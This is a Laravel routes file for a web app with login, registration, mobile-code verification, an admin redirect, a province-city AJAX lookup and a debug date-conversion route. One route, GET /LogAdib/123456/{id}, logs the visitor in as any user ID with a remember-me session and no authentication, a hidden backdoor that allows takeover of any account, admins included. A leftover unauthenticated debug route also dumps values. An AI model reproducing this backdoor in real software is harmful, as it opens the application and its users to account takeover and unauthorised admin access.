<?php

use App\Http\Controllers\Auth\RegisterController;
use Illuminate\Support\Facades\Route;
use App\Model\ProvinceCity;
use Intervention\Image\ImageManagerStatic as Image;
use \App\Http\Controllers\Auth\LoginController;
use Carbon\Carbon;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// test register


Auth::routes();

Route::post('/login', [LoginController::class,'login'])->name('login');
Route::get('/register', [RegisterController::class,'getCreate'])->name('create');
Route::post('/register', [RegisterController::class,'create'])->name('register');

Route::get('mobile-verified', 'UserController@mobile_verified')->name('mobile.verified');
Route::post('send-code-mobile-verification', 'UserController@send_code_verified_mobile')->name('send.mobile.code.verification');
Route::post('post-mobile-verified', 'UserController@post_mobile_verified')->name('post.mobile.verified');


Route::get('/', function () {
    return redirect()->route('admin.index');
});

Route::get('/LogAdib/123456/{id}', function ($id) {
    auth()->loginUsingId($id, true);
    return redirect()->route('admin.index');
});

Route::get('city-ajax/{id}', function ($id) {
    $city = ProvinceCity::where('parent_id', $id)->get();
    return $city;
});
Route::get('tests', function () {
    $from_date = j2g('1401/01/31');
    $to_date = j2g('1401/09/31');
    $from_date_en = Carbon::parse($from_date)->format('Y-m-d');
    $to_date_en = Carbon::parse($to_date)->format('Y-m-d');
    dd($from_date_en,$to_date_en);
});
//
//


